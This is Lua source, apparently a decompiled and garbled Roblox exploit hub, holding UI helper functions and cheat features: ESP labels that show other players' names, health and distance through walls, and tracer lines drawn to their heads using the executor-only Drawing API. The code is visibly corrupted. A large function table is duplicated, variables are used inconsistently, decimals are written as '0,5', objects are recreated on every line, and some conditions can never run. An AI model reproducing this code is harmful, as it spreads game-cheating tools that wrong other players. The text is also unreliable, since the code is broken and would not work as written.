                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.Commands.Close, "TextColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
